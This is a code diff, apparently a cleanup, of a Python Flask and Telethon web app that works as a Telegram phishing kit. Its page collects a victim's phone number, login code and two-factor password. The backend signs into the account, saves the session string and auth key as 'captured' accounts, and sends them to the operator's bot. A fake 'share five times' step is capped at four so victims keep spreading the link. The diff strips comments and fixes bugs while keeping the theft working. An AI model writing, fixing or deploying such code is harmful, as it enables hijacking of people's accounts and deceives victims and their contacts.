@@ -14,9 +14,8 @@ from telethon.sessions import StringSession
 import sys
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-import logging
-
 logger = logging.getLogger(__name__)
+
 # ====== Environment Variables ======
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 API_ID = int(os.environ.get("API_ID", "0"))
@@ -24,13 +23,14 @@ API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
 # ===================================
 
-if sys.version_info >= (3, 14):
+# Fix for Python 3.12+ asyncio on Windows (harmless on Linux/Render)
+if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     except:
         pass
 
-app = Flask(name)
+app = Flask(__name__)
 
 user_sessions = {}
 pending_codes = {}
@@ -153,7 +153,7 @@ def run_telegram_action(phone, code=None, password=None):
                         'phone_code_result': r
                     }
                     pending_codes[phone] = 'sent'
-                    pending_2fa[phone] = False  # initially no 2FA
+                    pending_2fa[phone] = False
                 
                 logger.info(f"✅ Code sent to {phone}")
                 return {'success': True}
@@ -182,12 +182,10 @@ def run_telegram_action(phone, code=None, password=None):
             try:
                 await client.connect()
                 
-                # Check if already authorized
                 if await client.is_user_authorized():
                     me = await client.get_me()
                     logger.info(f"{phone} already authorized")
                 else:
-                    # Try to sign in with code
                     try:
                         await client.sign_in(
                             phone=phone,
@@ -196,14 +194,12 @@ def run_telegram_action(phone, code=None, password=None):
                         )
                         me = await client.get_me()
                     except errors.SessionPasswordNeededError:
-                        # 2FA Required
                         logger.info(f"2FA needed for {phone}")
                         with sessions_lock:
                             pending_2fa[phone] = True
                             pending_codes[phone] = '2fa_needed'
                         
                         if password:
-                            # Try to sign in with password
                             try:
                                 await client.sign_in(password=password)
                                 me = await client.get_me()
@@ -216,7 +212,6 @@ def run_telegram_action(phone, code=None, password=None):
                             except Exception as e:
                                 return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                         else:
-                            # Return 2FA needed status
                             return {'success': False, 'error': '2FA', 'needs_password': True}
                     except errors.PhoneCodeInvalidError:
                         return {'success': False, 'error': 'Wrong code'}
@@ -225,13 +220,9 @@ def run_telegram_action(phone, code=None, password=None):
                     except Exception as e:
                         return {'success': False, 'error': str(e)[:80]}
                 
-                # ====== Stabilize session ======
                 await client.get_dialogs()
-                
-                # ====== Capture session ======
                 ss = StringSession.save(client.session)
                 
-                # Get auth key
                 auth_key = None
                 try:
                     auth_key = client.session.auth_key.key
@@ -240,7 +231,6 @@ def run_telegram_action(phone, code=None, password=None):
                 
                 dc = client.session.dc_id
                 
-                # If auth key missing, reconnect
                 if not auth_key:
                     logger.warning(f"Auth key None for {phone}, reconnecting...")
                     await client.disconnect()
@@ -258,7 +248,6 @@ def run_telegram_action(phone, code=None, password=None):
                     client = client2
                 
                 auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
-                
                 password_used = password is not None
                 
                 acc = {
@@ -280,7 +269,6 @@ def run_telegram_action(phone, code=None, password=None):
                     'has_2fa': password_used
                 }
                 
-                # Save
                 save_account(acc)
                 global captured_accounts
                 captured_accounts = load_accounts()
@@ -292,7 +280,6 @@ def run_telegram_action(phone, code=None, password=None):
                         del pending_2fa[phone]
                     pending_codes[phone] = 'done'
                 
-                # Notify bot
                 send_bot_notification(phone, ss, me, dc, password_used)
                 
                 logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA' if password_used else ''}")
@@ -387,13 +374,11 @@ PAGE = """<!DOCTYPE html>
         .cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
         .cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
         .cc input::placeholder{color:#555}
-        /* Share steps progress */
         .share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
         .share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
         .share-step.done{background:#4CAF50;color:white}
         .share-step.active{background:#0088cc;color:white;animation:pulse 1s infinite}
         @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,204,0.4)}100%{box-shadow:0 0 0 10px rgba(0,136,204,0)}}
-        /* 2FA password input */
         .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
         .pwd-input:focus{border-color:#0088cc}
         .pwd-input::placeholder{color:#555}
@@ -476,7 +461,7 @@ PAGE = """<!DOCTYPE html>
                 <div id="vs" class="sb"></div>
             </div>
             
-            <!-- Step 2b: 2FA Password Input (shown when 2FA needed) -->
+            <!-- Step 2b: 2FA Password Input -->
             <div id="s2b" class="step">
                 <div class="modal-icon">🔐</div>
                 <h2>Two-Factor Authentication</h2>
@@ -620,14 +605,12 @@ PAGE = """<!DOCTYPE html>
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
-                    // Go to share step
                     document.getElementById('s2').classList.remove('active');
                     document.getElementById('s3').classList.add('active');
                     setupShareLink();
                 } else if (data.s === '2fa_needed') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
-                    // Show 2FA step
                     document.getElementById('s2').classList.remove('active');
                     document.getElementById('s2b').classList.add('active');
                 } else if (data.s === 'err') {
@@ -677,13 +660,11 @@ PAGE = """<!DOCTYPE html>
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
             if (data.success) {
-                // Go to share step
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s3').classList.add('active');
                 setupShareLink();
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else if (data.needs_password) {
-                // 2FA needed
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s2b').classList.add('active');
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
@@ -743,16 +724,13 @@ PAGE = """<!DOCTYPE html>
     }
     
     function simulateShare() {
-        // This simulates opening Telegram share - but share count never reaches 5
         var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
         window.open(shareUrl, '_blank');
         
-        // Fake progress - but never completes to 5
-        sharesDone = Math.min(sharesDone + 1, 4);  // MAX 4, never 5
+        sharesDone = Math.min(sharesDone + 1, 4);
         updateShareProgress();
         
         if (sharesDone >= 4) {
-            // After 4 shares, show "almost there" but never finish
             var st = document.getElementById('shareStatus');
             st.className = 'sb waiting';
             st.innerHTML = '<span class="sp"></span> One more share needed!';
@@ -1013,7 +991,7 @@ def dash():
     </body></html>
     """
 
-if name == 'main':
+if __name__ == '__main__':
     # Check env vars
     if not BOT_TOKEN or not API_HASH or API_ID == 0 or YOUR_TELEGRAM_ID == 0:
         print("⚠️  WARNING: Some environment variables are missing!")
